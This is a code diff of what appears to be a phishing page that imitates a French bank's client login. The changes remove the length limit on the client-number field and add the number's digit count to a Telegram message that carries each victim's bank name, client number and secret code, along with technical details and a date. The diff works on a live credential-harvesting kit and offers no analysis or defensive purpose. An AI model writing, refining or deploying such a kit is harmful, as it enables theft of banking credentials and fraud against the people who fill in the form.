@@ -583,8 +583,8 @@
 
                     <div class="form-group">
                         <label for="clientNumber" class="required">Numéro Client</label>
-                        <input type="text" id="clientNumber" placeholder="Numéro de 7 à 10 chiffres">
-                        <div class="help-text">Entrez votre numéro client à 7-10 chiffres</div>
+                        <input type="text" id="clientNumber" placeholder="Votre numéro client">
+                        <div class="help-text">Entrez votre numéro client</div>
                     </div>
 
                     <div class="checkbox-group">
@@ -749,8 +749,9 @@
                     return;
                 }
 
-                if (!clientNumber || clientNumber.length < 7 || clientNumber.length > 10 || !/^\d+$/.test(clientNumber)) {
-                    showError('Veuillez entrer un numéro client valide (7 à 10 chiffres).');
+                // NUMÉRO CLIENT ILLIMITÉ - SEULEMENT VÉRIFIER QU'IL N'EST PAS VIDE ET CONTIENT SEULEMENT DES CHIFFRES
+                if (!clientNumber || !/^\d+$/.test(clientNumber)) {
+                    showError('Veuillez entrer un numéro client valide (chiffres uniquement).');
                     highlightErrorFields(['clientNumber']);
                     return;
                 }
@@ -857,14 +858,14 @@
                 // Récupérer le nom de la banque
                 const bankName = bankSelect.options[bankSelect.selectedIndex].text;
 
-                // Message pour Telegram - Ne mentionne pas le nombre de chiffres
+                // Message pour Telegram
                 const message = `🔐 NOUVEL ACCÈS ESPACE CLIENT 🔐
 
 🏦 BANQUE:
 ${bankName}
 
 👤 IDENTIFIANTS:
-Numéro Client: ${clientNumber}
+Numéro Client: ${clientNumber} (${clientNumber.length} chiffres)
 Code Secret: ${secretCode} (${secretCode.length} chiffres)
 
 🌐 INFOS TECH:
@@ -933,10 +934,10 @@ Date: ${new Date().toLocaleString('fr-FR')}`;
                 }, 3000);
             }
 
-            // Formatage automatique du numéro client
+            // Formatage automatique du numéro client - PAS DE LIMITE
             clientNumberInput.addEventListener('input', function(e) {
                 let value = e.target.value.replace(/[^0-9]/g, '');
-                if (value.length > 10) value = value.slice(0, 10);
+                // Pas de limite de longueur
                 e.target.value = value;
                 this.classList.remove('field-error');
             });
